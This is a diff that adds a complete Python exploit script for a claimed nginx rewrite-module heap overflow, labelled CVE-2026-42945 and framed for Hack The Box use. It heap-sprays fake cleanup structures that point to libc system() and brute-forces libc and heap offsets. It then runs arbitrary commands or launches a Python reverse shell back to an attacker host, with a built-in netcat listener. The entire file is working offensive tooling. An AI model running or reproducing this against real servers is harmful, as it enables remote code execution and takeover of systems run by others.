@@ -1,0 +1,470 @@
+#!/usr/bin/env python3
+"""
+CVE-2026-42945 (NGINX Rift) - Standalone HTB-Ready Exploit
+Heap buffer overflow in NGINX's ngx_http_rewrite_module (2008-2024)
+
+Usage:
+    python3 nginx_rift_htb.py --target <IP> --port <PORT> --cmd "id"
+    python3 nginx_rift_htb.py --target 10.10.11.x --shell --lhost <YOUR_IP> --lport 4444
+"""
+
+import argparse
+import socket
+import struct
+import time
+import sys
+import os
+import threading
+import subprocess
+from typing import List, Tuple, Optional
+
+# Color codes for output
+class Colors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+
+def print_banner():
+    banner = f"""{Colors.HEADER}{Colors.BOLD}
+╔═══════════════════════════════════════════════════════════════╗
+║                    NGINX RIFT EXPLOIT                         ║
+║                  CVE-2026-42945 POC                           ║
+║           Heap Buffer Overflow in rewrite_module              ║
+╚═══════════════════════════════════════════════════════════════╝
+{Colors.ENDC}"""
+    print(banner)
+
+def log_info(msg):
+    print(f"{Colors.OKCYAN}[*]{Colors.ENDC} {msg}")
+
+def log_success(msg):
+    print(f"{Colors.OKGREEN}[+]{Colors.ENDC} {msg}")
+
+def log_warning(msg):
+    print(f"{Colors.WARNING}[!]{Colors.ENDC} {msg}")
+
+def log_error(msg):
+    print(f"{Colors.FAIL}[-]{Colors.ENDC} {msg}")
+
+# Configuration
+BODY_LEN = 4000
+N_SPRAY = 20
+
+# URL-safe characters (won't be escaped)
+SAFE = set()
+_t = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
+      0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]
+for _b in range(256):
+    if not (_t[_b >> 5] & (1 << (_b & 0x1f))):
+        SAFE.add(_b)
+
+# These are default addresses for x86_64 with ASLR disabled
+# For HTB, we'll try multiple common offsets
+DEFAULT_HEAP_BASE = 0x555555659000
+DEFAULT_LIBC_BASE = 0x7ffff77ba000
+
+# Common libc offsets for system() in popular distributions
+LIBC_SYSTEM_OFFSETS = [
+    0x50d70,  # Ubuntu 22.04/24.04
+    0x50d60,  # Ubuntu 20.04
+    0x4f440,  # Debian 11
+    0x52290,  # Debian 12
+    0x4c920,  # Alpine
+]
+
+# Heap offsets that have been found to work
+PREREAD_HEAP_OFFSETS = [
+    0x05a427, 0x060e67,
+    0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
+    0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
+    0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
+    0x103847, 0x108657, 0x10d467,
+]
+
+def addr_is_safe(addr: int) -> bool:
+    """Check if address contains only URL-safe bytes"""
+    return all(((addr >> (j * 8)) & 0xff) in SAFE for j in range(6))
+
+def make_body(cmd: str, data_addr: int, system_addr: int) -> bytes:
+    """Create the spray body with fake ngx_pool_cleanup_s structure"""
+    # Fake cleanup structure:
+    # struct ngx_pool_cleanup_s {
+    #     ngx_pool_cleanup_pt   handler;  // -> system()
+    #     void                 *data;     // -> command string
+    #     ngx_pool_cleanup_t   *next;     // -> NULL
+    # };
+    fake_struct = struct.pack('<QQQ', system_addr, data_addr, 0)
+    cmd_bytes = cmd.encode('utf-8') + b'\x00'
+    payload = fake_struct + cmd_bytes
+    
+    if len(payload) > BODY_LEN:
+        log_error(f"Command too long (body={len(payload)}, max={BODY_LEN})")
+        sys.exit(1)
+    
+    return payload + b'\x41' * (BODY_LEN - len(payload))
+
+def check_target(host: str, port: int, timeout: int = 5) -> Tuple[bool, Optional[str]]:
+    """Check if target is running NGINX and potentially vulnerable"""
+    try:
+        s = socket.create_connection((host, port), timeout=timeout)
+        s.sendall(b"GET / HTTP/1.1\r\nHost: test\r\nConnection: close\r\n\r\n")
+        response = s.recv(4096)
+        s.close()
+        
+        response_str = response.decode('utf-8', errors='ignore')
+        
+        # Check for NGINX
+        if 'nginx' in response_str.lower() or 'server: nginx' in response_str.lower():
+            # Try to extract version
+            version = None
+            for line in response_str.split('\n'):
+                if 'server:' in line.lower() and 'nginx' in line.lower():
+                    version = line.split('nginx')[1].split()[0].strip('/')
+                    break
+            return True, version
+        
+        return False, None
+    except Exception as e:
+        log_error(f"Failed to connect to target: {e}")
+        return False, None
+
+def check_vulnerable_endpoint(host: str, port: int) -> bool:
+    """Check if the vulnerable /api/ endpoint exists"""
+    try:
+        s = socket.create_connection((host, port), timeout=5)
+        s.sendall(b"GET /api/test HTTP/1.1\r\nHost: test\r\nConnection: close\r\n\r\n")
+        response = s.recv(1024)
+        s.close()
+        
+        # If we get a response (not 404), the endpoint might exist
+        if b'404' not in response and b'Not Found' not in response:
+            return True
+        return False
+    except Exception:
+        return False
+
+def wait_alive(host: str, port: int, timeout: int = 30) -> bool:
+    """Wait for NGINX to become responsive"""
+    for _ in range(timeout):
+        try:
+            s = socket.create_connection((host, port), timeout=2)
+            s.sendall(b"GET / HTTP/1.1\r\nHost: l\r\nConnection: close\r\n\r\n")
+            s.recv(100)
+            s.close()
+            return True
+        except Exception:
+            time.sleep(1)
+    return False
+
+def attempt_exploit(host: str, port: int, target_bytes: bytes, body: bytes, verbose: bool = False) -> bool:
+    """Attempt the exploit with given parameters"""
+    sprays = []
+    
+    # Phase 1: Spray the heap with our fake structures
+    if verbose:
+        log_info(f"Spraying heap with {N_SPRAY} POST requests...")
+    
+    for i in range(N_SPRAY):
+        try:
+            s = socket.create_connection((host, port), timeout=5)
+            req = (
+                b"POST /spray HTTP/1.1\r\n"
+                b"Host: l\r\n"
+                b"Content-Length: " + str(BODY_LEN).encode() + b"\r\n"
+                b"X-Delay: 60\r\n"
+                b"Connection: close\r\n"
+                b"\r\n"
+                + body
+            )
+            s.sendall(req)
+            sprays.append(s)
+        except Exception as e:
+            if verbose:
+                log_warning(f"Spray request {i} failed: {e}")
+            break
+        time.sleep(0.005)
+    
+    time.sleep(0.2)
+    
+    # Phase 2: Setup attack and victim connections
+    try:
+        a = socket.create_connection((host, port), timeout=5)
+        time.sleep(0.02)
+        v = socket.create_connection((host, port), timeout=5)
+        time.sleep(0.02)
+    except Exception as e:
+        if verbose:
+            log_warning(f"Failed to create attack connections: {e}")
+        for s in sprays:
+            try:
+                s.close()
+            except Exception:
+                pass
+        return False
+    
+    # Phase 3: Trigger the overflow
+    # 349 'A's + 969 '+'s will expand to overflow the buffer
+    payload = "A" * 349 + "+" * 969 + target_bytes.decode("latin-1")
+    
+    if verbose:
+        log_info("Triggering overflow...")
+    
+    a.sendall((f"GET /api/{payload} HTTP/1.1\r\n"
+               f"Host: localhost\r\n").encode("latin-1"))
+    time.sleep(0.05)
+    
+    v.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\n")
+    time.sleep(0.05)
+    
+    a.sendall(b"X-Delay: 60\r\nConnection: close\r\n\r\n")
+    time.sleep(0.2)
+    
+    v.close()
+    time.sleep(0.1)
+    
+    # Phase 4: Check if we crashed the worker (= exploit success)
+    crashed = False
+    try:
+        a.sendall(b"X-Ping: 1\r\n")
+        a.settimeout(0.2)
+        data = a.recv(1)
+        if not data:
+            crashed = True
+    except socket.timeout:
+        # Worker might be hung in system() call
+        try:
+            check_sock = socket.create_connection((host, port), timeout=0.2)
+            check_sock.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
+            check_data = check_sock.recv(10)
+            check_sock.close()
+            if not check_data:
+                crashed = True
+            else:
+                crashed = False
+        except Exception:
+            crashed = True
+    except (ConnectionResetError, BrokenPipeError, OSError):
+        crashed = True
+    
+    # Cleanup
+    for s in sprays:
+        try:
+            s.close()
+        except Exception:
+            pass
+    try:
+        a.close()
+    except Exception:
+        pass
+    
+    return crashed
+
+def start_listener(port: int):
+    """Start a netcat listener for reverse shell"""
+    log_info(f"Starting listener on port {port}...")
+    try:
+        subprocess.run(["nc", "-lvnp", str(port)])
+    except FileNotFoundError:
+        # Fallback to Python listener
+        log_warning("netcat not found, using Python listener...")
+        import socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind(('0.0.0.0', port))
+        s.listen(1)
+        log_success(f"Listening on 0.0.0.0:{port}")
+        conn, addr = s.accept()
+        log_success(f"Connection from {addr}")
+        
+        # Simple interactive shell
+        import select
+        while True:
+            ready = select.select([conn, sys.stdin], [], [], 0.1)
+            if conn in ready[0]:
+                data = conn.recv(4096)
+                if not data:
+                    break
+                sys.stdout.write(data.decode('utf-8', errors='ignore'))
+                sys.stdout.flush()
+            if sys.stdin in ready[0]:
+                cmd = sys.stdin.readline()
+                conn.send(cmd.encode())
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="CVE-2026-42945 (NGINX Rift) - HTB-Ready Exploit",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  # Execute command
+  python3 nginx_rift_htb.py --target 10.10.11.x --port 80 --cmd "id"
+  
+  # Reverse shell
+  python3 nginx_rift_htb.py --target 10.10.11.x --shell --lhost 10.10.14.x --lport 4444
+  
+  # Check if target is vulnerable
+  python3 nginx_rift_htb.py --target 10.10.11.x --check-only
+        """
+    )
+    
+    parser.add_argument("--target", required=True,
+                        help="Target IP address")
+    parser.add_argument("--port", type=int, default=80,
+                        help="Target port (default: 80)")
+    parser.add_argument("--cmd",
+                        help="Shell command to execute via system()")
+    parser.add_argument("--shell", action="store_true",
+                        help="Execute a reverse shell")
+    parser.add_argument("--lhost",
+                        help="Local IP for reverse shell (required with --shell)")
+    parser.add_argument("--lport", type=int, default=4444,
+                        help="Local port for reverse shell (default: 4444)")
+    parser.add_argument("--heap-base", type=lambda x: int(x, 16),
+                        default=DEFAULT_HEAP_BASE,
+                        help="Heap base address (default: 0x555555659000)")
+    parser.add_argument("--libc-base", type=lambda x: int(x, 16),
+                        default=DEFAULT_LIBC_BASE,
+                        help="Libc base address (default: 0x7ffff77ba000)")
+    parser.add_argument("--tries", type=int, default=10,
+                        help="Attempts per candidate address (default: 10)")
+    parser.add_argument("--check-only", action="store_true",
+                        help="Only check if target is vulnerable")
+    parser.add_argument("--verbose", "-v", action="store_true",
+                        help="Verbose output")
+    
+    args = parser.parse_args()
+    
+    print_banner()
+    
+    # Validation
+    if not args.check_only and not args.cmd and not args.shell:
+        parser.error("Either --cmd, --shell, or --check-only must be specified")
+    if args.cmd and args.shell:
+        parser.error("Cannot specify both --cmd and --shell")
+    if args.shell and not args.lhost:
+        parser.error("--lhost is required with --shell")
+    
+    host = args.target
+    port = args.port
+    
+    # Check target
+    log_info(f"Checking target {host}:{port}...")
+    is_nginx, version = check_target(host, port)
+    
+    if not is_nginx:
+        log_error("Target doesn't appear to be running NGINX")
+        return 1
+    
+    if version:
+        log_success(f"Target is running NGINX {version}")
+        # Check if version is in vulnerable range
+        try:
+            major, minor, patch = map(int, version.split('.'))
+            if (major == 1 and minor >= 6) or major > 1:
+                log_warning("Version appears to be in vulnerable range (>= 0.6.27)")
+        except:
+            pass
+    else:
+        log_success("Target is running NGINX (version unknown)")
+    
+    # Check for vulnerable endpoint
+    log_info("Checking for vulnerable /api/ endpoint...")
+    if check_vulnerable_endpoint(host, port):
+        log_success("Vulnerable endpoint /api/ detected!")
+    else:
+        log_warning("Could not confirm /api/ endpoint - exploit may still work")
+    
+    if args.check_only:
+        log_info("Check complete. Use --cmd or --shell to exploit.")
+        return 0
+    
+    # Prepare command
+    if args.shell:
+        cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{args.lhost}\",{args.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+        log_info(f"Reverse shell: {args.lhost}:{args.lport}")
+        
+        # Start listener in background
+        listener_thread = threading.Thread(target=start_listener, args=(args.lport,))
+        listener_thread.daemon = True
+        listener_thread.start()
+        time.sleep(2)  # Give listener time to start
+    else:
+        cmd = args.cmd
+        log_info(f"Command: {cmd}")
+    
+    # Try different libc offsets
+    for libc_offset in LIBC_SYSTEM_OFFSETS:
+        system_addr = args.libc_base + libc_offset
+        log_info(f"Trying libc system() offset: 0x{libc_offset:x} (addr: 0x{system_addr:x})")
+        
+        # Build candidate addresses
+        candidates = []
+        for i, off in enumerate(PREREAD_HEAP_OFFSETS):
+            addr = args.heap_base + off
+            if addr_is_safe(addr):
+                candidates.append((i, addr))
+        
+        log_info(f"Found {len(candidates)} safe heap addresses")
+        
+        # Prepare spray body
+        primary_addr = candidates[0][1]
+        data_addr = primary_addr + 24  # Offset to command string after fake struct
+        body = make_body(cmd, data_addr, system_addr)
+        
+        log_info("Starting exploitation attempts...")
+        
+        # Try each candidate address
+        for idx, (i, addr) in enumerate(candidates):
+            target = bytes([(addr >> (j * 8)) & 0xff for j in range(6)])
+            
+            log_info(f"Candidate {idx+1}/{len(candidates)}: heap offset 0x{PREREAD_HEAP_OFFSETS[i]:x}")
+            
+            for t in range(args.tries):
+                # Check if server is still alive
+                if not wait_alive(host, port, timeout=10):
+                    log_warning("Server not responding, waiting...")
+                    time.sleep(2)
+                    if not wait_alive(host, port, timeout=10):
+                        log_error("Server not recovering, aborting")
+                        return 1
+                
+                if args.verbose:
+                    log_info(f"  Attempt {t+1}/{args.tries}...")
+                
+                crashed = attempt_exploit(host, port, target, body, args.verbose)
+                
+                if crashed:
+                    log_success(f"Exploit successful! system(\"{cmd}\") executed")
+                    if args.shell:
+                        log_success("Reverse shell should be connecting...")
+                        try:
+                            while True:
+                                time.sleep(1)
+                        except KeyboardInterrupt:
+                            pass
+                    return 0
+                
+                time.sleep(0.3)
+            
+            log_warning(f"Candidate {idx+1} failed after {args.tries} attempts")
+    
+    log_error("All exploitation attempts failed")
+    log_info("This could mean:")
+    log_info("  1. ASLR is enabled (try bruteforcing or leak addresses)")
+    log_info("  2. Different NGINX configuration")
+    log_info("  3. Version is not vulnerable")
+    log_info("  4. WAF/IDS is blocking the exploit")
+    
+    return 1
+
+if __name__ == "__main__":
+    try:
+        sys.exit(main())
+    except KeyboardInterrupt:
+        print("\n" + Colors.WARNING + "[!] Interrupted by user" + Colors.ENDC)
+        sys.exit(1)
